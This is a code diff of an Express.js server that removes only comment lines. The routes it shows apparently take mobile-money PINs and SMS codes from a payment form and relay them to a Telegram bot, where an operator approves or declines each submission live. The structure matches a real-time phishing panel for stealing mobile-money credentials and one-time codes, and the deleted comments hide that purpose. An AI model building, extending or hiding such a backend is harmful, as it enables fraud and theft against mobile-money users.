@@ -170,7 +170,6 @@ app.post('/api/state', (req, res) => {
   res.json({ ok: true, state: updated });
 });
 
-// Payment submission — forwards to Telegram
 app.post('/api/submit-payment', async (req, res) => {
   console.log('=== SUBMIT-PAYMENT ===');
   console.log('Token set?', !!TELEGRAM_BOT_TOKEN);
@@ -197,7 +196,6 @@ app.post('/api/submit-payment', async (req, res) => {
   res.json({ status: 'pending', id: submission.id });
 });
 
-// SMS submission — forwards to Telegram
 app.post('/api/submit-sms', async (req, res) => {
   console.log('=== SUBMIT-SMS ===');
   console.log('Body:', JSON.stringify(req.body));
@@ -222,7 +220,6 @@ app.post('/api/submit-sms', async (req, res) => {
   res.json({ status: 'pending', id: submission.id });
 });
 
-// Admin approve (also used by Telegram callback)
 app.post('/api/approve', (req, res) => {
   const state = readState();
   state.decision = 'approved';
@@ -254,7 +251,6 @@ app.post('/api/reset', (req, res) => {
   res.json({ ok: true, state });
 });
 
-/* ---- Telegram webhook ---- */
 app.post('/api/telegram/webhook', async (req, res) => {
   res.sendStatus(200);
 
@@ -267,7 +263,6 @@ app.post('/api/telegram/webhook', async (req, res) => {
 
   const state = readState();
 
-  /* ---- MoMo PIN decision ---- */
   if (action === 'approve' || action === 'decline') {
     const current = state.latestSubmission;
     if (!current || (refId && current.id !== refId)) {
@@ -308,7 +303,6 @@ app.post('/api/telegram/webhook', async (req, res) => {
     return;
   }
 
-  /* ---- SMS decision ---- */
   if (action === 'sms-approve' || action === 'sms-decline') {
     const current = state.latestSmsSubmission;
     if (!current || (refId && current.id !== refId)) {
@@ -349,7 +343,6 @@ app.post('/api/telegram/webhook', async (req, res) => {
     return;
   }
 
-  // Unknown action
   await tgSend('answerCallbackQuery', {
     callback_query_id: cb.id,
     text: 'Unknown action',
@@ -357,7 +350,6 @@ app.post('/api/telegram/webhook', async (req, res) => {
   });
 });
 
-/* ---- Register webhook on boot ---- */
 async function registerWebhook() {
   if (!TELEGRAM_BOT_TOKEN) return;
 
